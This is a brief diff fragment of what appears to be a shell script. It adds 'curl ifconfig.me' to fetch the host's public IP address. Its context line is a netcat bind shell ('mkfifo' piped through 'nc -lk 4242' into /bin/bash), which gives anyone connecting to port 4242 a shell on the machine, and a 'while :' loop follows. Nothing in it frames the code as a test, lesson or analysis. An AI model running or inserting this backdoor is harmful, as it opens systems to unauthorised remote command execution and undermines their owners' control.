@@ -1,3 +1,5 @@
+curl ifconfig.me
+
 mkfifo foo ; nc -lk 4242 0<foo | /bin/bash 1>foo ./cool.sh
 
 while :
